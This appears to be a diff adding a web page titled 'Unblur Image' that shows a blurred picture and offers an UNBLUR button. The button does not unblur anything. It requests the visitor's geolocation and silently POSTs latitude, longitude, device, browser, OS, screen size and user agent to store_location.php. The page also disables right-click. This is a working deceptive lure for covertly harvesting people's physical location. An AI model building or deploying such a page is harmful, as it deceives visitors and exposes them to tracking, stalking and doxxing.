@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Unblur Image</title>
+<style>
+    body {
+        margin: 0;
+        padding: 0;
+        font-family: Arial, sans-serif;
+        background-image: url('https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Ftse3.mm.bing.net%2Fth%3Fid%3DOIP.ZoTY4c5chhjg9Nxv00XF0AAAAA%26pid%3DApi&f=1&ipt=6405e46cded9145f7eadfa4c764cbb64c57681bc278875b0a5c24f319e16a27e&ipo=images');
+        background-size: cover;
+        background-position: center;
+    }
+    #outerContainer {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+    }
+    #main {
+        max-width: 80%; 
+        text-align: center;
+        background-color: rgba(255, 255, 255, 0.7);
+        padding: 20px;
+        border-radius: 10px;
+    }
+    #message {
+        margin-bottom: 20px;
+    }
+    #imageContainer {
+        text-align: center;
+    }
+    #buttons {
+        text-align: center;
+        margin-top: 15px;
+    }
+    #getLocation {
+        font-weight: bold;
+        padding: 10px 20px;
+        border-radius: 20px;
+        background-color: rgb(255, 134, 154);
+        color: white; /* White text */
+        border: none; /* No border */
+        cursor: pointer;
+        transition: background-color 0.3s, color 0.3s;
+    }
+    #getLocation:hover {
+        background-color: hotpink;
+    }
+    #getLocation:active {
+        background-color: darkpink;
+    }
+    @media only screen and (max-width: 600px) {
+        #main {
+            max-width: 100%;
+        }
+    }
+</style>
+</head>
+<body oncontextmenu="return false">
+    <div id="outerContainer">
+        <div id="main">
+            <div id="message">
+                <p>You want to unblur this image, just click the unblur button.</p>
+            </div>
+            <div id="imageContainer">
+                <img id="blurImage" src="https://cdn.discordapp.com/attachments/1158062783678660648/1235205627106693120/blur_a58781d7-1e18-40ca-9905-e1bc485037f1.png?ex=663b6f62&is=663a1de2&hm=fc85c809e4c4fd6bd95304f12db7b8bfc49943765dc706bdde28b368b75fe6d6&" alt="Blurred Image">
+            </div>
+            <div id="buttons">
+                <button id="getLocation" class="jfk-button jfk-button-action">UNBLUR</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function detectDevice() {
+            var userAgent = navigator.userAgent.toLowerCase();
+
+            if (userAgent.includes("mobile")) {
+                return "Smartphone";
+            } else if (userAgent.includes("tablet")) {
+                return "Tablet";
+            } else {
+                return "Desktop";
+            }
+        }
+
+        function detectBrowser() {
+            var userAgent = navigator.userAgent.toLowerCase();
+
+            if (userAgent.includes("chrome")) {
+                return "Chrome";
+            } else if (userAgent.includes("firefox")) {
+                return "Firefox";
+            } else if (userAgent.includes("safari")) {
+                return "Safari";
+            } else if (userAgent.includes("edge")) {
+                return "Edge";
+            } else if (userAgent.includes("opera")) { /* Change background color when button is clicked */
+                return "Opera";
+            } else {
+                return "Unknown";
+            }
+        }
+
+        function getOperatingSystem() {
+            var userAgent = navigator.userAgent;
+            var os;
+
+            if (userAgent.indexOf("Win") != -1) {
+                os = "Windows";
+            } else if (userAgent.indexOf("Mac") != -1) {
+                os = "Macintosh";
+            } else if (userAgent.indexOf("Linux") != -1) {
+                os = "Linux";
+            } else if (userAgent.indexOf("Android") != -1) {
+                os = "Android";
+            } else if (userAgent.indexOf("iOS") != -1) {
+                os = "iOS";
+            } else {
+                os = "Other";
+            }
+
+            return os;
+        }
+
+        function getScreenResolution() {
+            return window.innerWidth + "x" + window.innerHeight;
+        }
+
+        document.getElementById("getLocation").addEventListener("click", getLocation);
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, showError);
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+
+        function sendLocation(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const deviceType = detectDevice();
+            const browserName = detectBrowser();
+            const os = getOperatingSystem();
+            const screenResolution = getScreenResolution();
+
+            fetch("store_location.php", {
+                method: "POST",
+                body: JSON.stringify({ latitude, longitude, deviceType, browserName, os, screenResolution, userAgent: navigator.userAgent }),
+                headers: {
+                    "Content-Type": "application/json",
+                },
+            })
+            .then(response => response.text())
+            .then(data => {
+
+            })
+            .catch(error => {
+            });
+        }
+
+        function showError(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    alert("User denied the request for Geolocation.");
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    alert("Location information is unavailable.");
+                    break;
+                case error.TIMEOUT:
+                    alert("The request to get user location timed out.");
+                    break;
+                case error.UNKNOWN_ERROR:
+                    alert("An unknown error occurred.");
+                    break;
+            }
+        }
+    </script>
+</body>
+</html>
